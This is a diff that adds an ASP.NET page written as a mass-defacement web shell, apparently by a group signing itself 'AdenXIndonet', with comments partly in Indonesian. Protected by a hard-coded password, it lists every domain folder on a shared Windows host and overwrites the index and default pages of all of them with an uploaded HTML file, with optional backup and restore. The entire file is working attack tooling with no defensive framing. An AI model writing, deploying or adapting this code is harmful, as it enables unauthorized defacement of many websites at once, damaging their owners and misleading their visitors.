@@ -1,0 +1,314 @@
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Text" %>
+
+<script runat="server">
+    
+    // MASS DEFACER TOOL - AdenXIndonet 🩸🔥
+    // Upload 1 file, deface SEMUA domain!
+    
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        Response.ContentType = "text/html";
+        
+        string action = Request.QueryString["action"];
+        string targetFile = Request.QueryString["file"];
+        string pass = Request.QueryString["pass"];
+        
+        // Password proteksi (biar gak sembarang orang pake)
+        if (pass != "AdenX2025")
+        {
+            ShowForm();
+            return;
+        }
+        
+        if (action == "deface" && Request.Files.Count > 0)
+        {
+            // Proses upload dan mass deface
+            MassDeface();
+        }
+        else if (action == "list")
+        {
+            // List semua domain
+            ListDomains();
+        }
+        else if (action == "restore" && !string.IsNullOrEmpty(targetFile))
+        {
+            // Restore file asli (kalo ada backup)
+            RestoreFile(targetFile);
+        }
+        else
+        {
+            ShowForm();
+        }
+    }
+    
+    private void ShowForm()
+    {
+        Response.Write(@"
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>AdenX Mass Defacer</title>
+            <style>
+                body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;}
+                .container{max-width:600px;margin:0 auto;border:1px solid #00ff00;padding:20px;}
+                input,textarea,select{width:100%;margin:10px 0;background:#1a1a1a;color:#00ff00;border:1px solid #00ff00;padding:8px;}
+                input[type=submit]{background:#00ff00;color:#000;cursor:pointer;font-weight:bold;}
+                .info{color:#0ff;font-size:12px;}
+                .title{text-align:center;color:#f0f;font-size:24px;margin-bottom:20px;}
+            </style>
+        </head>
+        <body>
+            <div class='container'>
+                <div class='title'>🔥 MASS DEFACER 🔥</div>
+                <div class='info'>Target: E:\New_Files\ (SEMUA DOMAIN)</div>
+                <div class='info'>" + GetDomainCount() + @" domain ditemukan</div>
+                
+                <form method='post' enctype='multipart/form-data'>
+                    <input type='hidden' name='action' value='deface'>
+                    <input type='hidden' name='pass' value='AdenX2025'>
+                    
+                    <label>File HTML Deface:</label>
+                    <input type='file' name='defaceFile' accept='.html,.htm' required>
+                    
+                    <label>Target filename (kosongin biar otomatis):</label>
+                    <input type='text' name='targetName' placeholder='index.html / default.aspx / dll'>
+                    
+                    <label>Opsi:</label>
+                    <select name='option'>
+                        <option value='all'>Semua domain (full force)</option>
+                        <option value='index'>Cuma ganti index.html</option>
+                        <option value='default'>Cuma ganti default.aspx</option>
+                        <option value='backup'>Backup dulu baru ganti</option>
+                    </select>
+                    
+                    <input type='submit' value='🔥 MASS DEFACE NOW! 🔥'>
+                </form>
+                
+                <br>
+                <div class='info'><a href='?action=list&pass=AdenX2025' style='color:#0ff;'>📋 List Semua Domain</a></div>
+            </div>
+        </body>
+        </html>
+        ");
+    }
+    
+    private int GetDomainCount()
+    {
+        try
+        {
+            string basePath = @"E:\New_Files\";
+            if (Directory.Exists(basePath))
+            {
+                return Directory.GetDirectories(basePath).Length;
+            }
+        }
+        catch { }
+        return 0;
+    }
+    
+    private void ListDomains()
+    {
+        try
+        {
+            string basePath = @"E:\New_Files\";
+            Response.Write("<pre style='background:#000;color:#0f0;padding:10px;'>");
+            Response.Write("📋 DAFTAR SEMUA DOMAIN:\n");
+            Response.Write("========================\n\n");
+            
+            if (Directory.Exists(basePath))
+            {
+                string[] domains = Directory.GetDirectories(basePath);
+                int i = 1;
+                foreach (string domain in domains)
+                {
+                    string domainName = Path.GetFileName(domain);
+                    Response.Write($"{i++}. {domainName}\n");
+                }
+                Response.Write($"\nTotal: {domains.Length} domain\n");
+            }
+            else
+            {
+                Response.Write("Folder E:\\New_Files\\ tidak ditemukan!\n");
+            }
+            
+            Response.Write("\n\n<a href='?pass=AdenX2025'>⬅ Kembali</a>");
+            Response.Write("</pre>");
+        }
+        catch (Exception ex)
+        {
+            Response.Write("Error: " + ex.Message);
+        }
+    }
+    
+    private void MassDeface()
+    {
+        try
+        {
+            Response.ContentType = "text/html";
+            Response.Write("<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>");
+            Response.Write("<h2 style='color:#f0f;'>🔥 MASS DEFACE EXECUTION 🔥</h2>");
+            Response.Write("<pre>");
+            
+            HttpPostedFile file = Request.Files[0];
+            string targetName = Request.Form["targetName"];
+            string option = Request.Form["option"] ?? "all";
+            
+            if (file == null || file.ContentLength == 0)
+            {
+                Response.Write("❌ File kosong!\n");
+                Response.Write("</pre><a href='?pass=AdenX2025'>⬅ Kembali</a></body></html>");
+                return;
+            }
+            
+            // Baca file HTML
+            byte[] fileData = new byte[file.ContentLength];
+            file.InputStream.Read(fileData, 0, file.ContentLength);
+            string fileContent = Encoding.UTF8.GetString(fileData);
+            
+            // Tentukan nama target
+            if (string.IsNullOrEmpty(targetName))
+            {
+                targetName = Path.GetFileName(file.FileName);
+                if (string.IsNullOrEmpty(targetName))
+                    targetName = "index.html";
+            }
+            
+            string basePath = @"E:\New_Files\";
+            
+            if (!Directory.Exists(basePath))
+            {
+                Response.Write("❌ Folder E:\\New_Files\\ tidak ditemukan!\n");
+                Response.Write("</pre><a href='?pass=AdenX2025'>⬅ Kembali</a></body></html>");
+                return;
+            }
+            
+            // Dapatkan semua folder domain
+            string[] domains = Directory.GetDirectories(basePath);
+            Response.Write($"🎯 Target: {domains.Length} domain\n");
+            Response.Write($"📄 File: {targetName}\n");
+            Response.Write($"⚙️ Opsi: {option}\n");
+            Response.Write("========================\n\n");
+            
+            int success = 0;
+            int failed = 0;
+            
+            foreach (string domain in domains)
+            {
+                string domainName = Path.GetFileName(domain);
+                
+                try
+                {
+                    Response.Write($"📁 {domainName}... ");
+                    
+                    // Tentukan file yang akan ditimpa berdasarkan opsi
+                    string[] targetFiles = GetTargetFiles(domain, targetName, option);
+                    
+                    foreach (string targetFile in targetFiles)
+                    {
+                        // Backup kalo opsi backup
+                        if (option == "backup" && File.Exists(targetFile))
+                        {
+                            string backupFile = targetFile + ".backup_" + DateTime.Now.Ticks;
+                            File.Copy(targetFile, backupFile);
+                            Response.Write($"[BACKUP] ");
+                        }
+                        
+                        // Tulis file deface
+                        File.WriteAllBytes(targetFile, fileData);
+                        Response.Write($"✔ {Path.GetFileName(targetFile)} ");
+                    }
+                    
+                    Response.Write("✅\n");
+                    success++;
+                }
+                catch (Exception ex)
+                {
+                    Response.Write($"❌ ({ex.Message.Substring(0, 30)}...)\n");
+                    failed++;
+                }
+            }
+            
+            Response.Write("\n========================\n");
+            Response.Write($"✅ BERHASIL: {success} domain\n");
+            Response.Write($"❌ GAGAL: {failed} domain\n");
+            
+            if (failed > 0)
+            {
+                Response.Write("\n⚠️ Beberapa domain gagal: (permission denied / folder kosong)\n");
+            }
+            
+            Response.Write("\n🎉 MASS DEFACE COMPLETE! 🎉\n");
+            Response.Write("</pre>");
+            Response.Write("<br><a href='?pass=AdenX2025' style='color:#0f0;'>⬅ Kembali ke menu</a>");
+            Response.Write("</body></html>");
+        }
+        catch (Exception ex)
+        {
+            Response.Write($"❌ FATAL ERROR: {ex.Message}\n");
+            Response.Write("</pre><a href='?pass=AdenX2025'>⬅ Kembali</a></body></html>");
+        }
+    }
+    
+    private string[] GetTargetFiles(string domainPath, string defaultName, string option)
+    {
+        List<string> files = new List<string>();
+        
+        switch (option)
+        {
+            case "index":
+                files.Add(Path.Combine(domainPath, "index.html"));
+                files.Add(Path.Combine(domainPath, "index.htm"));
+                break;
+                
+            case "default":
+                files.Add(Path.Combine(domainPath, "default.aspx"));
+                files.Add(Path.Combine(domainPath, "Default.aspx"));
+                files.Add(Path.Combine(domainPath, "default.asp"));
+                break;
+                
+            case "all":
+            default:
+                // Cari semua kemungkinan file index
+                string[] possibleFiles = {
+                    "index.html", "index.htm", "default.aspx", "Default.aspx",
+                    "default.asp", "index.php", "home.html", "main.aspx",
+                    defaultName
+                };
+                
+                foreach (string file in possibleFiles.Distinct())
+                {
+                    if (!string.IsNullOrEmpty(file))
+                        files.Add(Path.Combine(domainPath, file));
+                }
+                break;
+        }
+        
+        return files.Distinct().ToArray();
+    }
+    
+    private void RestoreFile(string filePath)
+    {
+        try
+        {
+            string backupFile = filePath + ".backup_*";
+            string[] backups = Directory.GetFiles(Path.GetDirectoryName(filePath), Path.GetFileName(filePath) + ".backup_*");
+            
+            if (backups.Length > 0)
+            {
+                File.Copy(backups[0], filePath, true);
+                Response.Write($"✅ Restored: {Path.GetFileName(filePath)} from backup\n");
+            }
+            else
+            {
+                Response.Write("❌ No backup found\n");
+            }
+        }
+        catch (Exception ex)
+        {
+            Response.Write($"❌ Restore error: {ex.Message}\n");
+        }
+    }
+    
+</script>
